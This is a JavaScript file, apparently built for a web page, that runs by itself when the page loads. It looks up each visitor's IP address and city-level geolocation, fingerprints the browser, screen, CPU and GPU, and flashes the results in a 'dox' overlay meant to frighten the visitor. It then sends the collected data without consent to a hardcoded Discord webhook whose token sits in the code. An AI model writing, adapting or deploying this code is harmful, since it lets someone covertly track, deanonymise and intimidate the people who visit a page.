async function startDox() {
  try {
    // Elements, safely accessed
    const doxElement = document.getElementById("dox");
    const doxBgVideo = document.getElementById("dox-bg-vid");
    const doxOverlay = document.getElementById("dox-overlay");

    if (doxBgVideo?.play) doxBgVideo.play();
    if (doxElement) doxElement.style.opacity = "1";

    let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
    if (doxOverlay) doxOverlay.style.fontSize = fontSize + "px";

    // Simple browser detection helper (basic)
    function parseUserAgent(ua) {
      let name = "Unknown";
      let version = "Unknown";
      let platform = navigator.platform || "Unknown";
      let isMobile = /Mobi|Android/i.test(ua);

      if (/Chrome\/(\S+)/.test(ua)) {
        name = "Chrome";
        version = ua.match(/Chrome\/(\S+)/)[1];
      } else if (/Firefox\/(\S+)/.test(ua)) {
        name = "Firefox";
        version = ua.match(/Firefox\/(\S+)/)[1];
      } else if (/Safari\/(\S+)/.test(ua) && /Version\/(\S+)/.test(ua)) {
        name = "Safari";
        version = ua.match(/Version\/(\S+)/)[1];
      } else if (/Edg\/(\S+)/.test(ua)) {
        name = "Edge";
        version = ua.match(/Edg\/(\S+)/)[1];
      }

      return { name, version, platform, isMobile };
    }

    // Display + collect data
    const collectedData = {};
    async function displayInfo(label, value) {
      collectedData[label] = value || "N/A";
      if (!doxOverlay) return;
      const span = document.createElement("span");
      span.innerText = `${label}: ${value}`;
      doxOverlay.appendChild(span);

      // Adjust font size if too tall
      const height = doxOverlay.getBoundingClientRect().height;
      if (height > window.innerHeight) {
        fontSize *= 0.9;
        doxOverlay.style.fontSize = fontSize + "px";
      }
      await new Promise((r) => setTimeout(r, 200));
    }

    // Fetch helpers with retry
    async function fetchJsonWithRetry(url, retries = 3) {
      for (let i = 0; i < retries; i++) {
        try {
          const res = await fetch(url);
          if (!res.ok) throw new Error(`HTTP ${res.status}`);
          return await res.json();
        } catch {
          if (i === retries - 1) throw new Error(`Failed to fetch ${url}`);
          await new Promise((r) => setTimeout(r, 500));
        }
      }
    }

    // Collect IP and location info
    const ipData = await fetchJsonWithRetry("https://wtfismyip.com/json");
    const ip = ipData.YourFuckingIPAddress || "Unknown IP";
    const locationData = await fetchJsonWithRetry("https://we-are-jammin.xyz/json/" + ip);

    // Parse browser info
    const ua = navigator.userAgent;
    const browserData = parseUserAgent(ua);

    // Display collected info
    await displayInfo("IP Address", ip);
    await displayInfo("Country", locationData.country);
    await displayInfo("Region", locationData.regionName);
    await displayInfo("City", locationData.city);
    await displayInfo("ZIP Code", locationData.zip);
    await displayInfo("Full Location", ipData.YourFuckingLocation);
    await displayInfo("Latitude", locationData.lat);
    await displayInfo("Longitude", locationData.lon);
    await displayInfo("Timezone", locationData.timezone);
    await displayInfo("Current Time", new Date().toLocaleString());
    await displayInfo("ISP", locationData.isp);
    await displayInfo("Organization", locationData.org);
    await displayInfo("Autonomous System", locationData.as);
    await displayInfo("Browser Name", browserData.name);
    await displayInfo("Platform Name", browserData.platform);
    await displayInfo("Browser Version", browserData.version);
    await displayInfo("Mobile/Tablet", browserData.isMobile ? "Yes" : "No");
    await displayInfo("Referrer", document.referrer || "None");
    await displayInfo("System Languages", navigator.languages.join(", "));
    await displayInfo("Screen Width", screen.width + " px");
    await displayInfo("Screen Height", screen.height + " px");
    await displayInfo("Window Width", window.innerWidth + " px");
    await displayInfo("Window Height", window.innerHeight + " px");
    await displayInfo("Display Pixel Depth", screen.pixelDepth);

    if (screen.orientation) {
      await displayInfo("Screen Orientation", screen.orientation.type.split("-")[0]);
      await displayInfo("Screen Rotation", screen.orientation.angle + " degrees");
    }

    await displayInfo("CPU Threads", navigator.hardwareConcurrency);
    await displayInfo(
      "Available Browser Memory",
      window.performance?.memory
        ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) + " MB"
        : "N/A"
    );

    // GPU info
    const canvas = document.createElement("canvas");
    let gl, debugInfo;
    try {
      gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      debugInfo = gl?.getExtension("WEBGL_debug_renderer_info");
    } catch {}
    if (gl && debugInfo) {
      await displayInfo("GPU Vendor", gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
      await displayInfo("GPU Info", gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
    }

    // Send to Discord webhook as JSON file
    await sendToDiscordWebhook(collectedData);
  } catch (error) {
    console.error("startDox error:", error);
  }
}

async function sendToDiscordWebhook(data) {
  const webhookUrl =
    "https://discord.com/api/webhooks/1402845085288366261/FummiU0Zb1bHBQC6qhMyTOx-ba990D6lSEnBmegUzkIH_kj-n3doBp7C6eFJtHBkJaxh";

  try {
    const jsonBlob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
    const jsonFile = new File([jsonBlob], "client-info.json");

    const formData = new FormData();
    formData.append("file", jsonFile);
    formData.append(
      "payload_json",
      JSON.stringify({
        content: "New client info JSON file attached.",
      })
    );

    const res = await fetch(webhookUrl, {
      method: "POST",
      body: formData,
    });

    if (!res.ok) {
      throw new Error(`Discord webhook error: ${res.status} ${res.statusText}`);
    }
  } catch (err) {
    console.error("sendToDiscordWebhook error:", err);
  }
}

// Start the process immediately
startDox();